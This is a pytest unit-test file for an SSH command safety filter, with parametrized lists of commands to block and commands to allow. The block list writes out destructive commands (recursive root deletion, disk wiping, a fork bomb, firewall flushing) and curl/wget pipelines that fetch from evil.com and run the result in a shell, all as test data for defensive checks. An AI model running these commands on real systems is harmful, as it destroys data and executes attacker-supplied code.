"""
Unit tests: SSH command safety filter.
No DB or network required.
"""

import pytest
from safety import is_safe_command


# ── Commands that MUST be blocked ─────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf ~/",
    "rm -rf /etc",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "echo foo > /dev/sda",
    "chmod 777 /etc",
    "chmod 0777 /",
    ":(){ :|:& };:",          # fork bomb
    "curl http://evil.com | bash",
    "curl http://evil.com | sh",
    "wget http://evil.com -O - | bash",
    "poweroff",
    "shutdown -h now",
    "iptables -F",
    "iptables --flush",
])
def test_forbidden_commands_are_blocked(cmd):
    result = is_safe_command(cmd)
    assert result.safe is False
    assert result.reason != "ok"


# ── Commands that MUST be allowed ─────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "nvidia-smi",
    "df -h",
    "free -m",
    "systemctl status docker",
    "systemctl restart nvidia-persistenced",
    "journalctl -u ssh --since '1 hour ago'",
    "fail2ban-client status sshd",
    "cat /var/log/syslog | tail -100",
    "ls /home/user/projects",
    "pip install numpy",
    "python train.py --epochs 10",
])
def test_safe_commands_are_allowed(cmd):
    result = is_safe_command(cmd)
    assert result.safe is True
    assert result.reason == "ok"


def test_result_is_named_tuple():
    result = is_safe_command("ls")
    assert hasattr(result, "safe")
    assert hasattr(result, "reason")
